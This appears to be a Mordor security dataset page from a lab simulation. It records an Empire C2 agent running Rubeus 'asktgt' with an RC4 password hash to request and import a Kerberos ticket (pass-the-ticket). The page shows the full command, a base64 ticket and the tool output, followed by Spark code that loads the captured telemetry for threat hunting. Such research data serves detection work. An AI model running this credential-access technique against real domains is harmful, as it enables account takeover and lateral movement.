# Empire Rubeus ASKTGT

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-190319145126 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/03/19 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Empire |
| Simulation Script | https://github.com/GhostPack/Rubeus |
| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt.tar.gz |

## Dataset Description
This dataset represents adversaries crafting raw AS-REQ (TGT request) traffic for a specific user and encryption key (/rc4, /aes128, /aes256, or /des) to request TGTs

## Adversary View
```
(Empire: 2MES3XN6) > shell Rubeus.exe asktgt /user:Mmidge /rc4:b415baa073a14f81f8c89a2a384f4a68 /ptt
[*] Tasked 2MES3XN6 to run TASK_SHELL
[*] Agent 2MES3XN6 tasked with task ID 21
(Empire: 2MES3XN6) > ______        _                      
  (_____ \      | |                     
  _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: b415baa073a14f81f8c89a2a384f4a68
[*] Using domain controller: HFDC01.shire.com (172.18.39.5)
[*] Building AS-REQ (w/ preauth) for: 'shire.com\Mmidge'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIE5DCCBOCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+KADAgEFoQsbCVNISVJFLkNPTaIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJc2hpcmUuY29to4IDwjCCA76gAwIBEqEDAgECooIDsASCA6xLDFM5i+GcjKhK
      ix5DoHwWPlrrbj4nPOcTyK/umBEnffx9hz7tu3acyQU127mvFR7u0JO3h6U6FPrKPz2iJ6v3sx5AYGM6
      Imf0J2NBWb3+AU0WmuOBCa3k/BL+jl49isw6CuWHKrqyOk7SaoRORdd9G0hDv5zpHeF5Nzfz4dQ3GqmO
      W2ORZuTQR868MYEFYnCIjY+wNf/ve9Cie6isW170KSEMPrWdQbeSFMu6KtJaCNLTc2800JTO3ObrOZUW
      zylDRelTgBY4FCTyBUaseF45EWwFyiMeeABhgUZ1iFPGezsplcczGpaYB19bLz2r89j5k+3IJGzyOcA9
      hECNycNVzycIcU4SUtKtxqiRLoPqfPjHq8codY1npbUsovsW6wEi25lgFxzlVdxF2Bek368qBU1B1s9g
      CL06GUSjlfjPj9Heb7exTr9r+4j4JL+qVZaqlBtAQ4J38CKNJ9RdZME/9wRg6I/E15P8NNUAr7IOyF6S
      cYlNQ07uRFRKBgi30JSdBC7CSe2x546Jrrd17YQtDOHbw1WFP7HvYgdT+Miuit/WoRttWmNTEv4vj6oD
      +AuTrQKxnhbebef6MXXsR4ouDrBIlIw6r5T476ezkbNJeQwB6oryMUOsI3wu3DDFdRD7ZBY869fSC7Xe
      1+6vRO4Vu/mUXYzw9xkJ0C7X+c4ljJetCZ/YV3zoc6Tw5WLjtfFJ0HuFdIxxOEj8xK0BoyGwnDz3fOGC
      mEjH47U/w0EsUdBmnsZzRTujrTwGFbm/oCjOV9Dgae/aVLe0A+TSrWH2H8aKFmGeczrtTgEkGZDJyudm
      bVdeymTc0bv8AT8s0moOKc64dhtib10LPnakbWDOSQOydi/abwuIaAB6+21F3cmZ9lq5/7e1LyYKWnxd
      ATHPz+M9kWJi+xeqombWvozrjM2uIozFik7nY0rMdrbd/ItlML7bCuOuybksFe/1mmwscWvCoTOePzNS
      NU2znzc8vDOSfaE5WLI9c1hJVjkarx9iL+kSM7N3yQEXkuwQuTY5Yswx1bht28sKjsU+Q0dZxdhNeErd
      lJekqyf5NAKI2fmawmWBmzcXm7NDRATgDf3N9tpiTOW0x0Blv2F+SWXparZ06E5wdqNsV4l2Yf9x6yOp
      exrQvjCznKbpbh0u1rlhm0Ya8yieDqbCKEIzxIk1IjYwx/4OQ6fdGAm6SjF+rH/Pnyh/o5X4DxLSeGEy
      LPDjuDBHuReqj4UP//bhH7r5UptZuQ+cZ5liu58eo4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEw
      ga6gGzAZoAMCARehEgQQfj5vhePBJY0eMPFDHvkIxKELGwlTSElSRS5DT02iEzARoAMCAQGhCjAIGwZN
      bWlkZ2WjBwMFAEDhAAClERgPMjAxOTAzMTkxODU1NDlaphEYDzIwMTkwMzIwMDQ1NTQ5WqcRGA8yMDE5
      MDMyNjE4NTU0OVqoCxsJU0hJUkUuQ09NqR4wHKADAgECoRUwExsGa3JidGd0GwlzaGlyZS5jb20=

[*] Action: Import Ticket
[+] Ticket successfully imported!

[*] Action: Describe Ticket

  UserName              :  Mmidge
  UserRealm             :  SHIRE.COM
  ServiceName           :  krbtgt/shire.com
  ServiceRealm          :  SHIRE.COM
  StartTime             :  3/19/2019 1:55:49 PM
  EndTime               :  3/19/2019 11:55:49 PM
  RenewTill             :  3/26/2019 1:55:49 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  rc4_hmac
  Base64(key)           :  fj5vhePBJY0eMPFDHvkIxA==


..Command execution completed.

(Empire: 2MES3XN6) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/empire_rubeus_asktgt_ptt.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        